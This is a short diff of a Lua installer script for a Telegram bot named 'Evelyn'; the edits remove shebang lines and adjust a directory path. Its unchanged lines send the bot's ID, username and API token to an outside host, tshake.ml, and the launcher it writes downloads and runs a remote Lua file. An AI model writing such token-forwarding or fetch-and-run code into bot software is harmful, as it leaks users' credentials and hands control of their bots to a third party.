@@ -67,8 +67,7 @@ Create_Info(database:get(Server_Evelyn.."Token_Evelyn"),database:get(Server_Evel
 http.request("http://tshake.ml/add/?id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
 local RunEvelyn = io.open("Evelyn", 'w')
 RunEvelyn:write([[
-#!/usr/bin/env bash
-cd Evelyn
+cd $HOME/Evelyn
 token="]]..database:get(Server_Evelyn.."Token_Evelyn")..[["
 rm -fr Evelyn.lua
 wget "https://raw.githubusercontent.com/DevArMoF/Evelyn/main/Evelyn.lua"
@@ -80,7 +79,6 @@ done
 RunEvelyn:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
-#!/usr/bin/env bash
 cd $HOME/Evelyn
 while(true) do
 rm -fr ../.telegram-cli
